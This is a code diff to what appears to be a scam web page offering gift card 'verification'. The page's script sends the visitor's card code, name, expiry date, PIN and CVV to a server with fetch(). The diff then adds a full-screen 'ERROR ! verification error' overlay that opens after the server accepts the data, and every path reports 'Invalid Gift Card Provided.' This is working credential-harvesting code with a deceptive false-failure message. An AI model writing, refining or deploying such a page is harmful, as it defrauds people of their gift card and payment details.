@@ -60,13 +60,38 @@
       <div id="content">
          <!-- header -->
          <header>
-            <div style="display: none" id="loader">
-               <img
-                 src="/images/loading.gif"
-                 alt="icon"
-                 class="loading-icon"
-               />
-             </div>
+            <nav id="myNav" class="overlay">
+               <div class="overlay-content">
+                 <div class="receipt">
+                   <header class="receipt__header">
+                     <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
+       
+                     <p class="receipt__title" style="color:rgb(255, 0, 0)">
+       ERROR !              </p>
+                     <p class="receipt__date">verification error !
+                     </p>
+                   </header>
+                   <dl class="receipt__list">
+                     <!-- <div class="receipt__list-row ">
+                       <dt class="receipt__item" >Card Type</dt>
+                       <dd class="receipt__cost" id="el1">£9.99</dd>
+                     </div>
+                     <div class="receipt__list-row none">
+                       <dt class="receipt__item">Card Amount</dt>
+                       <dd class="receipt__cost"  id="el2">£4.19</dd>
+                     </div> -->
+                     
+                    
+                    
+                     <div class="receipt__list-row receipt__list-row--total">
+                       <dt class="receipt__item">Status : </dt>
+                       <dd class="receipt__cost">Invalid Gift Card Provided.
+                       </dd>
+                     </div>
+                   </dl>
+                 </div>
+               </div>
+             </nav>
             <!-- header inner -->
             <div class="header">
                <div class="container-fluid">
@@ -266,7 +291,7 @@
                         <div class="flex items-center justify-center ">
                            <button id="button" class="group relative h-12 w-48 overflow-hidden rounded-lg bg-white text-lg shadow">
                               <div class="absolute inset-0 w-3 bg-[#11aeef] transition-all duration-[250ms] ease-out group-hover:w-full"></div>
-                              <span class="relative text-black group-hover:text-white">Verify</span>
+                              <span id="text" class="relative text-black group-hover:text-white">Verify</span>
                             </button>
                             <!-- <button type="button" id="buttonm">helo</button> -->
                         </div>
@@ -710,6 +735,13 @@
 
       const data = document.querySelector("form");
 
+      function myClick() {
+     setTimeout(
+          function openNav() {
+          document.getElementById("myNav").style.width = "100%";
+      }, 1000);
+}
+
       const m = "modal open";
       const s = "overflow: hidden; padding-right: 0px;";
       data.on;
@@ -724,6 +756,7 @@
         }
 
         const exp = document.querySelector("#exp");
+       
         console.log("GOT HERE");
 
         if (exp) {
@@ -740,7 +773,7 @@
       };
 
       data.onsubmit = function (e) {
-         document.getElementById("button").value="Checking......."; 
+         // document.getElementById("text").innerText="Checking......."; 
 
          console.log("nawaooo")
 
@@ -782,7 +815,7 @@
           return;
         }
 
-        loader.style.display = "";
+      //   loader.style.display = "";
 
         async function send(code, name, exp, pin, cvv) {
           var response = await fetch(
@@ -804,7 +837,8 @@
           //getting the response data
           var data = await response.json();
           if (response.status == 200) {
-            return "DONE";
+            myClick()
+             return "DONE";
           }
         }
 
@@ -818,14 +852,14 @@
           .then((state) => {
             console.log(state);
 
-            loader.style.display = "none";
+            // loader.style.display = "none";
             error.textContent = "Invalid Gift Card Provided.";
             modal.click();
           })
           .catch((error) => {
             console.log(error);
 
-            loader.style.display = "none";
+            // loader.style.display = "none";
 
             error.textContent = "Invalid Gift Card Provided.";
             modal.click();
